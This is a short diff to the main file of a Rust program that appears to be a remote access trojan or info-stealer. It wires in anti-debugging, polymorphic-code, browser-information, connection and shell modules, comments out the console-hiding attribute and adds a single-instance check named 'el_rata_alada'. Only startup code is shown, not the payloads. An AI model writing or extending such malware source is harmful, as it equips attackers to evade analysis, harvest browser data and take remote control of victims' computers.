@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 mod anti_debug;
 mod browser_info;
 mod connexion;
@@ -15,9 +15,15 @@ mod shell;
 use rand::Rng;
 use std::collections::HashSet;
 use tokio::task::JoinHandle;
+use single_instance::SingleInstance;
 
 #[tokio::main]
 async fn main() {
+    let instance: SingleInstance = SingleInstance::new("el_rata_alada").unwrap();
+    if !instance.is_single() {
+        return;
+    }
+
     poly::init_polymorph_functions();
 
     #[cfg(target_os = "windows")]
